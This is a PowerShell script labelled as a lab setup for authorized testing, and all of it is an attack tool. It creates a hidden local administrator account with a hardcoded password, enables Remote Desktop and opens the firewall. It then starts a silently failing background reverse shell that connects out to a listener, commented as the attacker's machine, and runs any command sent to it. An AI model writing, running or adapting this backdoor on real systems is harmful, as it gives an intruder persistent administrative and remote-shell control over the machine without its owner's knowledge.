# ============================================================
# LAB SETUP SCRIPT – FOR AUTHORIZED TESTING ONLY
# ============================================================

# -------- CONFIGURATION (EDIT THESE) --------
$AdminUser   = "LabAdmin"
$AdminPass   = "P@ssw0rd123!"
$ListenerIP  = "192.168.1.100"   # Your attacker machine IP
$ListenerPort = 4444             # Your listener port
# --------------------------------------------

# Ensure script runs with administrative rights
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "This script must be run as Administrator. Restart with elevated privileges." -ForegroundColor Red
    exit 1
}

# 1. Create local admin account
try {
    New-LocalUser -Name $AdminUser -Password (ConvertTo-SecureString $AdminPass -AsPlainText -Force) -FullName "Lab Admin" -Description "Testing account" -ErrorAction Stop
    Add-LocalGroupMember -Group "Administrators" -Member $AdminUser
    Add-LocalGroupMember -Group "Remote Desktop Users" -Member $AdminUser
    Write-Host "[+] User '$AdminUser' created and added to Administrators and Remote Desktop Users." -ForegroundColor Green
} catch {
    Write-Host "[-] Failed to create user or add to groups: $_" -ForegroundColor Red
    exit 1
}

# 2. Enable Remote Desktop and open firewall
try {
    Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
    Enable-NetFirewallRule -DisplayGroup "Remote Desktop" -ErrorAction SilentlyContinue
    Write-Host "[+] Remote Desktop enabled and firewall rule applied." -ForegroundColor Green
} catch {
    Write-Host "[-] Error enabling RDP: $_" -ForegroundColor Yellow
}

# 3. C2 Reverse Shell (background job)
$reverseShellScript = {
    param($IP, $Port)
    try {
        $client = New-Object System.Net.Sockets.TCPClient($IP, $Port)
        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535 | % { 0 }
        while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
            $sendback = (iex $data 2>&1 | Out-String)
            $sendback2 = $sendback + "PS " + (pwd).Path + "> "
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte, 0, $sendbyte.Length)
            $stream.Flush()
        }
        $client.Close()
    } catch {
        # Silently fail – you can log if needed
    }
}

# Start the reverse shell as a background job
Start-Job -ScriptBlock $reverseShellScript -ArgumentList $ListenerIP, $ListenerPort

Write-Host "[+] Reverse shell (C2) started to $ListenerIP`:$ListenerPort in background." -ForegroundColor Green
Write-Host "[+] Setup complete. Check your listener for incoming connection." -ForegroundColor Cyan
